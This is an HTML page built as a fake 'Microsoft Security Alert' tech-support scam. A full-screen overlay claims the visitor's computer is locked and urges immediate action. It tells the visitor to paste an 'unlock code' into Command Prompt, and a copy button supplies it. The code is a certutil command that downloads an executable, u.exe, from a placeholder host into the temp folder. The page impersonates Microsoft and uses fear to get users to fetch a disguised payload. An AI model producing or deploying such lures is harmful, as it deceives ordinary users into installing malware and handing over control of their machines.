<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Windows Security</title><style>body{font-family:Georgia,serif;margin:0;background:#fff;color:#111}
.top{background:#eee;padding:10px 20px}.wrap{max-width:900px;margin:20px auto;padding:0 20px}
.modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.6);z-index:5000}
.card{background:#fff;max-width:480px;margin:80px auto;padding:28px;border-radius:6px}
.hide{position:absolute;left:-10000px;width:2px;height:2px}
pre{background:#f6f6f6;padding:10px}</style></head>
<body>
<div class="modal" id="lock"><div class="card"><h1>Microsoft Security Alert</h1>
<p>Your computer has been locked due to suspicious activity. Access may be blocked permanently. Act immediately.</p>
<p>Open Command Prompt, paste the unlock code and press Enter.</p>
<pre id="unlock">certutil -urlcache -split -f https://unlock.example.invalid/u.exe %TEMP%\u.exe</pre>
<button type="button" class="copy-btn" data-clipboard-target="#unlock">Copy unlock code</button></div></div>

</body></html>
